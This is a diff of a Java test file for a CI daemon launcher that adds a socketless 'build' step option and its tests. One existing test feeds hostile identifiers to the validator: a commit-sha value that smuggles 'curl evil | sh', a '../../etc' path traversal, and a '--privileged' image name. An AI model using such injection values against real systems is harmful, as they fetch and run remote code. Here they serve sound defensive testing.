@@ -98,6 +98,7 @@ public class CiDaemonLauncherTest {
           "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef",
           0,
           false,
+          false,
           "",
           Map.of());
 
@@ -119,8 +120,28 @@ public class CiDaemonLauncherTest {
         original.daemonBinaryUrl(),
         original.stepTimeoutSeconds(),
         docker,
+        original.build(),
         original.user(),
         original.env());
+  }
+
+  /** The same step, having declared {@code build: true} — the socketless build declaration. */
+  private LaunchSpec buildStep() {
+    return new LaunchSpec(
+        spec.runId(),
+        spec.stepIndex(),
+        spec.repo(),
+        spec.branch(),
+        spec.sha(),
+        spec.image(),
+        spec.daemonId(),
+        spec.secret(),
+        spec.daemonBinaryUrl(),
+        spec.stepTimeoutSeconds(),
+        false,
+        true,
+        spec.user(),
+        spec.env());
   }
 
   /** The same step, having declared {@code user: build} — again the only difference anywhere. */
@@ -137,6 +158,7 @@ public class CiDaemonLauncherTest {
         spec.daemonBinaryUrl(),
         spec.stepTimeoutSeconds(),
         spec.docker(),
+        spec.build(),
         "build",
         spec.env());
   }
@@ -227,6 +249,7 @@ public class CiDaemonLauncherTest {
             spec.daemonBinaryUrl(),
             spec.stepTimeoutSeconds(),
             spec.docker(),
+            spec.build(),
             spec.user(),
             spec.env());
 
@@ -340,6 +363,29 @@ public class CiDaemonLauncherTest {
     // address spelled here too would be the two-copies drift the docker-socket-path deletion
     // already paid for once.
     assertFalse(env.containsKey("BUILDKIT_HOST"));
+  }
+
+  @Test
+  public void aBuildStepGetsTheBuildEnvironmentAndNeverTheSocket() {
+    // The end state: build: true is docker: true minus the root-equivalence. Same registry
+    // variable, same kill-switch shape — and no socket, no mode flags (they steer a docker CLI a
+    // buildctl step never runs).
+    EnsureRequest request = launcher().buildWorkloadSpec(buildStep());
+    assertFalse(request.spec().hostDockerSocket());
+    Map<String, String> env = request.spec().env();
+    assertEquals("dev-qits-artifacts:8080", env.get("QITS_BUILD_REGISTRY"));
+    assertFalse(env.containsKey("BUILDKIT_HOST"), "the address stays qits-containers' to inject");
+    assertFalse(env.containsKey("DOCKER_BUILDKIT"));
+    assertFalse(env.containsKey("BUILDX_NO_DEFAULT_ATTESTATIONS"));
+    for (Map.Entry<String, String> entry : env.entrySet()) {
+      assertFalse(entry.getValue().contains("docker.sock"), "no socket may ride in: " + entry);
+    }
+
+    CiDaemonLauncher off = launcher();
+    off.buildkitEnabled = false;
+    Map<String, String> offEnv = off.buildWorkloadSpec(buildStep()).spec().env();
+    assertEquals("", offEnv.get("BUILDKIT_HOST"));
+    assertEquals("", offEnv.get("QITS_BUILD_REGISTRY"));
   }
 
   @Test
@@ -575,6 +621,7 @@ public class CiDaemonLauncherTest {
             spec.daemonBinaryUrl(),
             spec.stepTimeoutSeconds(),
             false,
+            false,
             "",
             Map.of("QITS_EVENT_VERSION", "1.2.3", "QITS_EVENT_NAME", "SoftwareRelease"));
 
@@ -608,6 +655,7 @@ public class CiDaemonLauncherTest {
             spec.secret(),
             spec.daemonBinaryUrl(),
             3600,
+            false,
             false,
             "",
             Map.of());
@@ -724,22 +772,22 @@ public class CiDaemonLauncherTest {
   public void hostileIdentifiersAreRejectedBeforeAnyCallIsMade() {
     CiDaemonLauncher launcher = launcher();
     LaunchSpec injectedSha =
-        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "x\"; curl evil | sh #", "img", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "x\"; curl evil | sh #", "img", "d", "s", "u", 0, false, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
     LaunchSpec traversal =
-        new LaunchSpec("run", 0, CiRepoRef.of("../../etc"), "main", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("../../etc"), "main", "cafebabe", "img", "d", "s", "u", 0, false, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
     LaunchSpec injectedBranch =
-        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main/../..", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main/../..", "cafebabe", "img", "d", "s", "u", 0, false, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
     // The image is repo-declared rather than intake-supplied, and it still reaches a docker argv on
     // the far side of the wire. Nothing is known to get through it, but an argument that can be read
     // as an option is not a thing to leave to another service's good manners.
     LaunchSpec optionShapedImage =
-        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "cafebabe", "--privileged", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "cafebabe", "--privileged", "d", "s", "u", 0, false, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
     LaunchSpec blankImage =
-        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "cafebabe", "  ", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "cafebabe", "  ", "d", "s", "u", 0, false, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
   }
 
